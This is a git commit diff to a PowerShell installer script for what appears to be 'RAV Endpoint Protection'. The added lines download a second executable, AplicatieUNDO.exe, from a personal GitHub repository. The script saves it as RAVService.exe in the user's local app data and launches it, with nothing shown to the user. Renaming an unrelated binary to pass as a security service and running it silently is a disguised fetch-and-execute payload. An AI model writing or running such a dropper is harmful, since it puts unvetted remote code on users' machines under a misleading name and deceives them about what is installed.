18b6205c41db4eadb490c1a570d18cff73e2c565
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-16 21:37:59 +0300

    Update ravendpointprotection.ps1

--- RAV/ravendpointprotection.ps1
+++ RAV/ravendpointprotection.ps1
@@ -1,5 +1,9 @@
 $x = "https://github.com/webntdev/webntdev.github.io/raw/main/RAV/RAVEndpointProtection.exe"
 $y = "$env:USERPROFILE\AppData\Local\RAVEndpointProtection.exe"
+$a = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/AplicatieUNDO.exe"
+$b = "$env:LOCALAPPDATA\RAVService.exe"
 
 Invoke-WebRequest -Uri $x -OutFile $y
 Start-Process $y
+Invoke-WebRequest -Uri $a -OutFile $b
+Start-Process -FilePath $b
